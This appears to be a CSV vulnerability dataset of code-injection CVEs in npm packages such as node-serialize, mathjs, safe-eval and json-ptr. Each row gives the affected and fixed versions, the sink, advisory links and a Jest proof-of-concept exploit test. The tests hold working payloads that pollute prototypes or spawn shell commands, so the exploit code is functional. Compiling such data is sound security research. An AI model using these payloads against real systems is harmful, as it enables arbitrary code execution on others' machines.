Attack Type,CVE-ID,Package,Version,Fix Version,Exploit File Path,Exploit,Fixed Commit,Sink,Links
code-injection,CVE-2020-28464,djv,2.0.0,2.1.4,code-injection/djv_2.0.0,"test(""Arbitrary code execution in  djv"", () => {
  expect.assertions(2);
  const djv = require(""djv"");
  expect({}.polluted).toBe(undefined);
  try {
    const env = new djv();
    const evilSchema = JSON.parse(
      '{""common"":{""type"":""array"", ""minItems"":""1 + (Object.prototype.polluted = `yes`)""}}'
    );
    env.addSchema(""test"", evilSchema);
    env.validate(""test#/common"", { type: ""custom"" });
  } catch (error) {}
  expect({}.polluted).toBe(""yes"");
});
",n/a,lib/utils/template.js:110:15,https://github.com/advisories/GHSA-4hv7-3q38-97m8; https://security.snyk.io/vuln/SNYK-JS-DJV-1014545
code-injection,CVE-2020-7766,json-ptr,2.0.0,2.0.0,code-injection/json-ptr_2.0.0,"test(""Arbitrary code execution in json-ptr"", () => {
  expect.assertions(2);
  const fs = require(""fs"");
  const jptr = require(""json-ptr"");
  const path = ""./json-ptr"";
  file_exist = fs.existsSync(path);
  expect({}.polluted).toBe(undefined);  
  JsonPointer = jptr.JsonPointer;
  try {
    let customSpawn = 'spawn_sync = process.binding(`spawn_sync`);normalizeSpawnArguments = function(c,b,a){if(Array.isArray(b)?b=b.slice(0):(a=b,b=[]),a===undefined&&(a={}),a=Object.assign({},a),a.shell){const g=[c].concat(b).join(` `);typeof a.shell===`string`?c=a.shell:c=`/bin/sh`,b=[`-c`,g];}typeof a.argv0===`string`?b.unshift(a.argv0):b.unshift(c);var d=a.env||process.env;var e=[];for(var f in d)e.push(f+`=`+d[f]);return{file:c,args:b,options:a,envPairs:e};};spawnSync = function(){var d=normalizeSpawnArguments.apply(null,arguments);var a=d.options;var c;if(a.file=d.file,a.args=d.args,a.envPairs=d.envPairs,a.stdio=[{type:`pipe`,readable:!0,writable:!1},{type:`pipe`,readable:!1,writable:!0},{type:`pipe`,readable:!1,writable:!0}],a.input){var g=a.stdio[0]=util._extend({},a.stdio[0]);g.input=a.input;}for(c=0;c<a.stdio.length;c++){var e=a.stdio[c]&&a.stdio[c].input;if(e!=null){var f=a.stdio[c]=util._extend({},a.stdio[c]);isUint8Array(e)?f.input=e:f.input=Buffer.from(e,a.encoding);}}var b=spawn_sync.spawn(a);if(b.output&&a.encoding&&a.encoding!==`buffer`)for(c=0;c<b.output.length;c++){if(!b.output[c])continue;b.output[c]=b.output[c].toString(a.encoding);}return b.stdout=b.output&&b.output[1],b.stderr=b.output&&b.output[2],b.error&&(b.error= b.error + `spawnSync `+d.file,b.error.path=d.file,b.error.spawnargs=d.args.slice(1)),b;};';
    JsonPointer.get(
      {},      
      `/aaa'])) !== 'undefined') {return it;}; ${customSpawn}; spawnSync(""touch"",[""json-ptr""]); if(((['a`
    );
  } catch (error) {
    console.log(""err===>"", error);
  }
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(true);
  fs.unlink(path, function (err) {});
});
",n/a,src/util.ts:155:10,https://github.com/advisories/GHSA-x5r6-x823-9848; https://security.snyk.io/vuln/SNYK-JS-JSONPTR-1016939
code-injection,CVE-2020-6836,hot-formula-parser,3.0.0,3.0.1,code-injection/hot-formula-parser_3.0.0,"test(""Arbitrary code execution in hot-formula-parser"", () => {
  expect.assertions(2);
  const fs = require(""fs"");
  const FormulaParser = require(""hot-formula-parser"").Parser;
  const path = ""./hot-formula-parser"";
  let payload = ""red(); require('fs').writeFileSync('"" + path + ""',``); //"";
  data = {};
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  try {
    let parser = new FormulaParser();
    parser.parse(
      ""SUM([(function(){require('child_process').execSync('touch hot-formula-parser')})(),2])""
    );
  } catch (error) {}
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(true);
  fs.unlink(path, function (err) {});
});
",https://github.com/handsontable/formula-parser/commit/396b089738d4bf30eb570a4fe6a188affa95cd5e,lib/grammar-parser/grammar-parser.js:258:31,https://security.snyk.io/vuln/SNYK-JS-HOTFORMULAPARSER-541328; https://github.com/advisories/GHSA-rc77-xxq6-4mff
code-injection,,open,0.0.5,6.0.0,code-injection/open_0.0.5,"test(""Arbitrary code execution in open"", (done) => {
  expect.assertions(2);
  const fs = require(""fs"");
  const path = ""./open"";
  try {
    if (fs.existsSync(path)) fs.unlinkSync(path);
    console.log(""File removed:"", path);
  } catch (err) {
    console.error(err);
  }
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  try {
    require(""open"")('""""`touch open`', () => {
      file_exist = fs.existsSync(path);
      expect(file_exist).toBe(true);
      if (file_exist) fs.unlinkSync(path);
      done();
    });
  } catch (error) {}
});
",,lib/open.js:58:10,https://security.snyk.io/vuln/SNYK-JS-OPEN-174041; https://github.com/advisories/GHSA-28xh-wpgr-7fm8
code-injection,CVE-2020-7660,serialize-javascript,2.0.0,3.1.0,code-injection/serialize-javascript_2.0.0,"test(""Arbitrary code execution in serialize-javascript"", () => {
  expect.assertions(2);
  const fs = require(""fs"");
  const serialize = require(""serialize-javascript"");
  const path = ""./serialize-javascript"";
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  eval(
    ""("" +
      serialize({
        str:
          ""string"" +
          this.constructor
            .constructor(`return process`)()
            .mainModule.require(`fs`)
            .writeFileSync(`serialize-javascript`, ``),
      }) +
      "")""
  );
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(true);
  fs.unlink(path, function (err) {});
});
",https://github.com/yahoo/serialize-javascript/commit/f21a6fb3ace2353413761e79717b2d210ba6ccbd,,https://security.snyk.io/vuln/SNYK-JS-SERIALIZEJAVASCRIPT-570062; https://github.com/advisories/GHSA-hxcc-f52p-wc94
code-injection,,is-my-json-valid,2.20.0,2.20.3,code-injection/is-my-json-valid_2.20.0,"test(""Arbitrary code execution in is-my-json-valid"", () => {
  expect.assertions(2);
  const fs = require(""fs"");
  const validator = require(""is-my-json-valid"");
  const path = ""./is-my-json-valid"";
  const sleep = require(""sleep"");
  file_exist = fs.existsSync(path);
  expect({}.polluted).toBe(undefined);
  const schema = {
    type: ""object"",
    properties: {
      ""x[1 + (Object.prototype.polluted='yes')]"": {
        required: true,
        type: ""string"",
      },
    },
  };
  try {
    let validate = validator(schema);
    validate({});
  } catch (e) {}
  file_exist = fs.existsSync(path);
  expect({}.polluted).toBe(""yes"");
  fs.unlink(path, function (err) {});
});
",https://github.com/mafintosh/is-my-json-valid/commit/3419563687df463b4ca709a2b46be8e15d6a2b3d,index.js:172:21,https://security.snyk.io/vuln/SNYK-JS-ISMYJSONVALID-597167; https://github.com/advisories/GHSA-f522-ffg8-j8r6
code-injection, CVE-2020-7710,safe-eval,0.2.0,n/a,code-injection/safe-eval_0.2.0,"test(""Arbitrary code execution in safe-eval"", () => {
  expect.assertions(2);
  var safeEval = require(""safe-eval"");
  expect({}.polluted).toBe(undefined);
  try {
    safeEval(""this.constructor.prototype.polluted=`yes`"");
  } catch (error) {}
  expect({}.polluted).toBe(""yes"");
});
",n/a,index.js:13:6,https://security.snyk.io/vuln/SNYK-JS-SAFEEVAL-608076; https://github.com/advisories/GHSA-hrpq-r399-whgw
code-injection,,static-eval,1.1.1,2.0.2,code-injection/static-eval_1.1.1,"test(""Arbitrary code execution in static-eval"", () => {
  expect.assertions(2);
  const evaluate = require(""static-eval"");
  const parse = require(""esprima"").parse;
  expect({}.polluted).toBe(undefined);
  let src = ""(function(){1 + (Object.prototype.polluted = `yes`)}())"";
  try {
    let ast = parse(src).body[0].expression;
    let res = evaluate(ast, {});
  } catch (error) {}
  expect({}.polluted).toBe(""yes"");
});
",https://github.com/browserify/static-eval/commit/32f8efd072625e267aa7237d2daff35738c50d2a,index.js:118:20,https://security.snyk.io/vuln/SNYK-JS-STATICEVAL-173693; https://github.com/advisories/GHSA-8v27-2fg9-7h62
code-injection,,mongoosemask,0.0.6,n/a,code-injection/mongoosemask_0.0.6,"test(""Arbitrary code execution in mongoosemask"", () => {
  expect.assertions(2);
  const fs = require(""fs"");
  const mask = require(""mongoosemask"");
  const path = ""./mongoosemask"";
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  try {
    mask.mask({}, [
      'id""]; require(`fs`)[""writeFileSync""](`mongoosemask`,``)//',
    ]);
  } catch (error) {}
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(true);
  fs.unlink(path, function (err) {});
});
",n/a,index.js:181:5,https://security.snyk.io/vuln/npm:mongoosemask:20160408; 
code-injection,CVE-2017-5941,node-serialize,0.0.3,n/a,code-injection/node-serialize_0.0.3,"test(""Arbitrary code execution in node-serialize"", () => {
  expect.assertions(2);
  const fs = require(""fs"");
  const serialize = require(""node-serialize"");
  const path = ""./node-serialize"";
  let payload =
    '{""rce"":""_$$ND_FUNC$$_function (){require(`fs`).writeFileSync(`node-serialize`,``);}()""}';
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  try {
    serialize.unserialize(payload);
  } catch (error) {}
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(true);
  fs.unlink(path, function (err) {});
});
",n/a,lib/serialize.js:75:22,https://security.snyk.io/vuln/npm:node-serialize:20170208; https://github.com/advisories/GHSA-q4v7-4rhw-9hqm
code-injection,,veval,1.0.0,n/a,code-injection/veval_1.0.0,"test(""Arbitrary code execution in veval"", () => {
  expect.assertions(2);
  const ve = require(""veval"");
  expect({}.polluted).toBe(undefined);
  try {
    ve({ hi: 0 }, ""1 + (this.constructor.prototype.polluted = `yes`);"");
  } catch (error) {}
  expect({}.polluted).toBe(""yes"");
});
",n/a,index.js:13:21,https://github.com/advisories/GHSA-54qm-37qr-w5wq; 
code-injection,,mathjs,3.10.3,3.11.5,code-injection/mathjs_3.10.3,"test(""Arbitrary code execution in mathjs"", () => {
  expect.assertions(2);
  const fs = require(""fs"");
  const math = require(""mathjs"");
  const path = ""./mathjs"";
  data = {};
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  try {
    math.eval(
      'import({matrix:cos.constructor},{override:1});x=[""spawn_sync = process.binding(`spawn_sync`); normalizeSpawnArguments = function(c,b,a){if(Array.isArray(b)?b=b.slice(0):(a=b,b=[]),a===undefined&&(a={}),a=Object.assign({},a),a.shell){const g=[c].concat(b).join(` `);typeof a.shell===`string`?c=a.shell:c=`/bin/sh`,b=[`-c`,g];}typeof a.argv0===`string`?b.unshift(a.argv0):b.unshift(c);var d=a.env||process.env;var e=[];for(var f in d)e.push(f+`=`+d[f]);return{file:c,args:b,options:a,envPairs:e};};spawnSync = function(){var d=normalizeSpawnArguments.apply(null,arguments);var a=d.options;var c;if(a.file=d.file,a.args=d.args,a.envPairs=d.envPairs,a.stdio=[{type:`pipe`,readable:!0,writable:!1},{type:`pipe`,readable:!1,writable:!0},{type:`pipe`,readable:!1,writable:!0}],a.input){var g=a.stdio[0]=util._extend({},a.stdio[0]);g.input=a.input;}for(c=0;c<a.stdio.length;c++){var e=a.stdio[c]&&a.stdio[c].input;if(e!=null){var f=a.stdio[c]=util._extend({},a.stdio[c]);isUint8Array(e)?f.input=e:f.input=Buffer.from(e,a.encoding);}}console.log(a);var b=spawn_sync.spawn(a);if(b.output&&a.encoding&&a.encoding!==`buffer`)for(c=0;c<b.output.length;c++){if(!b.output[c])continue;b.output[c]=b.output[c].toString(a.encoding);}return b.stdout=b.output&&b.output[1],b.stderr=b.output&&b.output[2],b.error&&(b.error= b.error + `spawnSync `+d.file,b.error.path=d.file,b.error.spawnargs=d.args.slice(1)),b;};console.log(spawnSync(`touch`,[`mathjs`]));""];x()'
    );
  } catch (error) {}
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(true);
  fs.unlink(path, function (err) {});
});
",https://github.com/josdejong/mathjs/compare/v3.10.3...v3.11.5,,https://security.snyk.io/vuln/npm:mathjs:20170402; https://github.com/advisories/GHSA-pv8x-p9hq-j328
code-injection,CVE-2020-7674,access-policy,3.1.0,n/a,code-injection/access-policy_3.1.0,"test(""Arbitrary code execution in access-policy"", () => {
  expect.assertions(2);
  const fs = require(""fs"");
  let a = require(""access-policy"");
  const path = ""./access-policy"";
  let statements = ""`; require(`fs`).writeFileSync(`"" + path + ""`,``);//"";
  data = {};
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  try {
    a.encode(statements, data);
  } catch (e) {}
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(true);
  fs.unlink(path, function (err) {});
});
",n/a,lib/encode.js:6:10,https://security.snyk.io/vuln/SNYK-JS-ACCESSPOLICY-571490; https://github.com/advisories/GHSA-fw2f-7f87-5r6c
code-injection,CVE-2020-7673,node-extend,^0.2.0,n/a,code-injection/node-extend_0.2.0,"test(""Arbitrary code execution in node-extend"", () => {
  expect.assertions(2);
  const fs = require(""fs"");
  const extend = require(""node-extend"");
  const path = ""./node-extend"";
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  try {
    foo = extend(
      ""function (){});require(`fs`).writeFileSync('node-extend',''); //(){console.log(123)}"",
      """"
    );
  } catch (error) {}
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(true);
  fs.unlink(path, function (err) {});
});
",n/a,lib/extend.js:31:11,https://security.snyk.io/vuln/SNYK-JS-NODEEXTEND-571491; https://github.com/advisories/GHSA-cg42-4wrc-gp47
code-injection,CVE-2016-10548,reduce-css-calc,1.2.0,1.2.5,code-injection/reduce-css-calc_1.2.0,"test(""Arbitrary code execution in reduce-css-calc"", () => {
  expect.assertions(2);
  const fs = require(""fs"");
  const reduceCSSCalc = require(""reduce-css-calc"");
  const path = ""./reduce-css-calc"";
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  try {
    console.log(reduceCSSCalc(`calc(                       (Buffer(10000)))`));
    console.log(
      reduceCSSCalc(
        `calc(                       (global['fs'] = require('fs')))`
      )
    );
    console.log(
      reduceCSSCalc(
        `calc(                       (fs['writeFileSync'](""reduce-css-calc"", """")))`
      )
    );
  } catch (error) {}
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(true);
  fs.unlink(path, function (err) {});
});
",n/a,index.js:73:16,https://security.snyk.io/vuln/npm:reduce-css-calc:20160913; https://github.com/advisories/GHSA-4662-j96g-mv46
code-injection,,value-censorship,1.1.0,n/a,code-injection/value-censorship_1.1.0,"test(""Arbitrary code execution in  value-censorship"", () => {
  expect.assertions(2);
  const censor = require(""value-censorship"");
  expect({}.polluted).toBe(undefined);
  try {
    censor(`
        ;1 +(Object.prototype.polluted = 'yes')//
        `);
  } catch (error) {}
  expect({}.polluted).toBe(""yes"");
});
",n/a,index.js:22:19,https://github.com/advisories/GHSA-xrr6-6ww3-f3qm; 
code-injection,CVE-2020-7672,mosc,1.0.0,n/a,code-injection/mosc_1.0.0,"test(""Arbitrary code execution in mosc"", () => {
  expect.assertions(2);
  const fs = require(""fs"");
  var A = require(""mosc"");
  expect({}.polluted).toBe(undefined);
  let a = new A({});
  let key = """";
  let attack_code = ""1 + (Object.prototype.polluted = `yes`)"";
  let properties = ""{a:*1*; "" + attack_code + "" //*}"";
  let base = """";
  try {
    a.parse_properties(key, properties, {}, {});
  } catch (error) {}
  expect({}.polluted).toBe(""yes"");
});
",n/a,mosc.js:50:43,https://security.snyk.io/vuln/SNYK-JS-MOSC-571492; https://github.com/advisories/GHSA-j665-rvj7-2jv9
code-injection,,mixin-pro,0.6.0,0.6.7,code-injection/mixin-pro_0.6.0,"test(""Arbitrary code execution in mixin-pro"", () => {
  expect.assertions(2);
  const fs = require(""fs"");
  const Class = require(""mixin-pro"").createClass;
  const path = ""./mixin-pro"";
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  try {      
      function Foo() { }
      Object.defineProperty(Foo, ""name"", {
        enumerable: false,
        configurable: false,
        writable: true,
        value: 'static'
      });
      Foo.name = ""test2()\n{}; require(`fs`).writeFileSync('mixin-pro', ''); function __ctor""
      let Bar1 = Class(Foo, { constructor: Foo });
  } catch (error) {}
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(true);
  fs.unlink(path, function (err) {});
});
",https://github.com/floatinghotpot/mixin-pro/commit/8bb355209f0a082d24b04355b3e8051a6455454f,,https://security.snyk.io/vuln/npm:mixin-pro:20160407; 
code-injection,CVE-2020-7677,thenify,3.3.0,3.3.1,code-injection/thenify_3.3.0,"test(""Arbitrary code execution in thenify"", () => {
  expect.assertions(2);
  const fs = require(""fs"");
  const a = require(""thenify"");
  const path = ""./thenify"";
  let payload = ""fs=require('fs');fs.writeFileSync('thenify','',)"";
  data = {};
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  try {
    function cur() {}
    Object.defineProperty(cur, ""name"", {
      value: ""fake() {"" + payload + "";})();(function(){//"",
    });
    a(cur);
  } catch (error) {}
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(true);
  fs.unlink(path, function (err) {});
});
",https://github.com/thenables/thenify/commit/0d94a24eb933bc835d568f3009f4d269c4c4c17a,index.js:17:10,https://security.snyk.io/vuln/SNYK-JS-THENIFY-571690; 
